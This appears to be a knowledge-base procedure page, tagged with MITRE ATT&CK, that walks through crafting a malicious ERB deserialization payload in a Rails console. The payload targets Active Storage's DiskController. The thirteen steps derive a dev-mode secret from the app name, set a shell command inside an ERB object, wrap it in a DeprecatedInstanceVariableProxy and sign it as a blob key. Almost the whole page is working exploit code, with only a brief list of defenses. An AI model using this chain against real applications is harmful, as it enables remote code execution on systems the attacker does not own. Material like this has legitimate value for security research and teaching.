---
tags:
  - rce
  - payload
  - erb
  - deserialization
type: procedure
tools:
  - '[[tools/rails-console]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/start-rails-console]]'
  - '[[commands/get-app-class-name]]'
  - '[[commands/derive-secret-key-base]]'
  - '[[commands/create-key-generator]]'
  - '[[commands/generate-activestorage-secret]]'
  - '[[commands/create-message-verifier]]'
  - '[[commands/define-malicious-code]]'
  - '[[commands/allocate-erb-object]]'
  - '[[commands/set-erb-src]]'
  - '[[commands/set-erb-filename]]'
  - '[[commands/set-erb-lineno]]'
  - '[[commands/create-deprecation-proxy]]'
  - '[[commands/generate-encoded-payload]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:49.411Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 91a5465e-e49b-4c94-a693-cc8a31c23a29
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Craft-Malicious-ERB-Payload-in-Rails-Console

## Summary

This procedure crafts a malicious ERB payload serialized via Marshal, encoded with MessageVerifier for the :blob_key purpose, enabling RCE on deserialization in Active Storage.

## Description

Exploits guessable secret_key_base in dev mode. Creates ERB object with shell command, wraps in DeprecatedInstanceVariableProxy to trigger execution on :result call during verification. Payload targets ActiveStorage::DiskController#decode_verified_key.

## Requirements

1. Vulnerable Rails app from previous procedure
2. Ruby console access
3. Knowledge of app name for secret derivation
4. No production secrets needed (dev mode)

## Defense

Defensive measures and detection strategies:

- Switch to JSON serializer in config/application.rb
- Use Rails 6+ defaults
- Validate and sanitize signed URL parameters
- Log deserialization attempts

## Objectives

1. Emulate verifier with dev secret
2. Inject ERB for command execution
3. Generate valid encoded_key for URL

## Instructions

### Step 1: Start Rails Console

**Context**: Enter interactive environment.

**Command** ([[commands/start-rails-console]]):
```bash
bundle exec rails console
```

> Loads Rails dev env. Expected: >> prompt in IRB.

### Step 2: Get App Class Name

**Context**: Retrieve name for secret derivation.

**Command** ([[commands/get-app-class-name]]):
```ruby
app_class_name = VerifierRce::Application.name
```

> Sets variable. Expected: "VerifierRce::Application".

### Step 3: Derive Secret Key Base

**Context**: Generate dev mode secret.

**Command** ([[commands/derive-secret-key-base]]):
```ruby
secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)
```

> Hashes app name. Expected: "7e485df67863e85e584b3feecb22276d".

### Step 4: Create Key Generator

**Context**: Setup for ActiveStorage key.

**Command** ([[commands/create-key-generator]]):
```ruby
key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
```

> Instantiates generator. Expected: KeyGenerator object.

### Step 5: Generate ActiveStorage Secret

**Context**: Derive specific secret.

**Command** ([[commands/generate-activestorage-secret]]):
```ruby
secret = key_generator.generate_key('ActiveStorage')
```

> Generates key. Expected: Binary string.

### Step 6: Create Message Verifier

**Context**: Prepare for encoding.

**Command** ([[commands/create-message-verifier]]):
```ruby
verifier = ActiveSupport::MessageVerifier.new(secret)
```

> Creates verifier. Expected: MessageVerifier with Marshal.

### Step 7: Define Malicious Code

**Context**: Set shell command.

**Command** ([[commands/define-malicious-code]]):
```ruby
code = '`touch /tmp/rce`'
```

> Defines code. Expected: "`touch /tmp/rce`".

### Step 8: Allocate ERB Object

**Context**: Create uninitialized ERB.

**Command** ([[commands/allocate-erb-object]]):
```ruby
erb = ERB.allocate
```

> Allocates instance. Expected: Uninitialized ERB.

### Step 9: Set ERB Source

**Context**: Inject code.

**Command** ([[commands/set-erb-src]]):
```ruby
erb.instance_variable_set :@src, code
```

> Sets @src. Expected: "`touch /tmp/rce`".

### Step 10: Set ERB Filename

**Context**: Configure for deserialization.

**Command** ([[commands/set-erb-filename]]):
```ruby
erb.instance_variable_set :@filename, '1'
```

> Sets @filename. Expected: "1".

### Step 11: Set ERB Lineno

**Context**: Final ERB config.

**Command** ([[commands/set-erb-lineno]]):
```ruby
erb.instance_variable_set :@lineno, 1
```

> Sets @lineno. Expected: 1.

### Step 12: Create Deprecation Proxy

**Context**: Wrap to trigger execution.

**Command** ([[commands/create-deprecation-proxy]]):
```ruby
dump_target = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
```

> Proxies ERB. Expected: Proxy object.

### Step 13: Generate Encoded Payload

**Context**: Sign and encode.

**Command** ([[commands/generate-encoded-payload]]):
```ruby
verifier.generate(dump_target, purpose: :blob_key)
```

> Encodes payload. Expected: "eyJfcmFpbHMiOnsibWVzc2FnZSI6...".

Exit console with `exit`.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/start-rails-console]]
- [[commands/get-app-class-name]]
- [[commands/derive-secret-key-base]]
- [[commands/create-key-generator]]
- [[commands/generate-activestorage-secret]]
- [[commands/create-message-verifier]]
- [[commands/define-malicious-code]]
- [[commands/allocate-erb-object]]
- [[commands/set-erb-src]]
- [[commands/set-erb-filename]]
- [[commands/set-erb-lineno]]
- [[commands/create-deprecation-proxy]]
- [[commands/generate-encoded-payload]]

## Tools Used

- [[tools/rails-console]]

## Tags

- rce
- payload
- erb
- deserialization
